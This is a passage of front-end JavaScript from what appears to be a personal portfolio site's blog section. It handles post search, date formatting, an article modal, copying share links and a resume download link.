                        
                        <div class="blog-actions">
                            ${addShareButton(blog)}
                            <a href="#" class="read-more-btn" onclick="openBlogModal(${blog.id})">
                                Read Full Story <i class="bi bi-arrow-right"></i>
                            </a>
                        </div>
                    </div>
                </article>
            </div>
        `;
        blogContainer.innerHTML += blogHTML;
    });
}

function searchBlogs(searchTerm) {
    if (!searchTerm.trim()) return [];
    
    const term = searchTerm.toLowerCase();
    return blogData.blogs.filter(blog => 
        blog.title.toLowerCase().includes(term) ||
        blog.excerpt.toLowerCase().includes(term) ||
        blog.content.toLowerCase().includes(term) ||
        blog.tags.some(tag => tag.toLowerCase().includes(term))
    ).sort((a, b) => new Date(b.date) - new Date(a.date));
}

function formatDate(dateString) {
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays === 1) return 'Yesterday';
    if (diffDays < 7) return `${diffDays} days ago`;
    if (diffDays < 30) return `${Math.floor(diffDays / 7)} weeks ago`;
    
    const options = { month: 'short', day: 'numeric', year: 'numeric' };
    return date.toLocaleDateString('en-US', options);
}

function viewAllBlogs() {
    currentView = 'all';
    currentSearchTerm = '';
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    loadBlogs();
}

function backToLatest() {
    currentView = 'latest';
    currentSearchTerm = '';
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    loadBlogs();
}

function handleSearch() {
    const searchInput = document.getElementById('blog-search');
    if (!searchInput) return;
    
    const searchTerm = searchInput.value.trim();
    
    if (searchTerm === '') {
        currentView = 'latest';
        currentSearchTerm = '';
    } else {
        currentView = 'search';
        currentSearchTerm = searchTerm;
    }
    
    loadBlogs();
}

function clearSearch() {
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    currentView = 'latest';
    currentSearchTerm = '';
    loadBlogs();
}

// ============================================
// BLOG MODAL
// ============================================

function openBlogModal(blogId) {
    const blog = blogData.blogs.find(b => b.id === blogId);
    if (!blog) return;

    const shareUrl = createShareUrl(blogId);
    const formattedDate = formatDate(blog.date);

    const modalHTML = `
        <div class="modal-dialog modal-xxl modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content blog-modal-content">
                <div class="modal-header blog-modal-header">
                    <div class="blog-header-content">
                        <span class="blog-date-modal">${formattedDate}</span>
                        <button class="share-link-btn share-btn-large" onclick="copyBlogLink(${blog.id})" title="Copy link to share">
                            <i class="bi bi-link-45deg"></i>
                            <span>Share Article</span>
                        </button>
                    </div>
                    <button type="button" class="close-btn" data-bs-dismiss="modal" aria-label="Close">
                        <i class="bi bi-x-lg"></i>
                    </button>
                </div>
                
                <div class="modal-body blog-modal-body">
                    <article class="blog-article-full">
                        <header class="article-header-full">
                            <h1 class="article-title-full">${blog.title}</h1>
                            <div class="article-meta-full">
                                <span class="article-author">By ${blog.author}</span>
                                <span class="article-read-time">${blog.readTime}</span>
                            </div>
                            <div class="article-featured-image">
                                <img src="${blog.image}" alt="${blog.title}">
                            </div>
                        </header>
                        
                        <div class="article-content-full">
                            ${blog.content}
                        </div>
                        
                        <footer class="article-footer-full">
                            <div class="article-tags-full">
                                <strong>Topics:</strong>
                                <div class="tags-container">
                                    ${blog.tags.map(tag => `<span class="article-tag">${tag}</span>`).join('')}
                                </div>
                            </div>
                            <div class="share-section">
                                <h5>Share This Article</h5>
                                <p>Copy the link below to share on any platform:</p>
                                <div class="share-link-container">
                                    <input type="text" readonly value="${shareUrl}" class="share-link-input" id="share-link-${blog.id}">
                                    <button class="copy-link-btn" onclick="copyInputLink(${blog.id})">
                                        <i class="bi bi-clipboard"></i> Copy
                                    </button>
                                </div>
                            </div>
                        </footer>
                    </article>
                </div>
                
                <div class="modal-footer blog-modal-footer">
                    <button type="button" class="close-article-btn" data-bs-dismiss="modal">
                        <i class="bi bi-arrow-left"></i> Back to Articles
                    </button>
                </div>
            </div>
        </div>
    `;

    const modal = document.getElementById('dynamicBlogModal');
    modal.innerHTML = modalHTML;
    
    const bsModal = new bootstrap.Modal(modal);
    bsModal.show();
    
    // Update URL hash for direct linking
    if (history.pushState) {
        window.history.pushState({}, '', `#blog?post=${blogId}`);
    }
}

function copyInputLink(blogId) {
    const input = document.getElementById(`share-link-${blogId}`);
    if (input) {
        input.select();
        input.setSelectionRange(0, 99999);
        
        navigator.clipboard.writeText(input.value).then(() => {
            const btn = input.nextElementSibling;
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
            btn.style.background = '#28a745';
            
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.style.background = '';
            }, 2000);
        });
    }
}

// Make functions available globally
window.openBlogModal = openBlogModal;
window.copyInputLink = copyInputLink;

// Download pdf
function downloadResume() {
    const link = document.createElement('a');
    link.href = '#resumeModal'; // Your PDF filename
    link.download = 'Milan_Gautam_Resume.pdf';
    link.click();
}
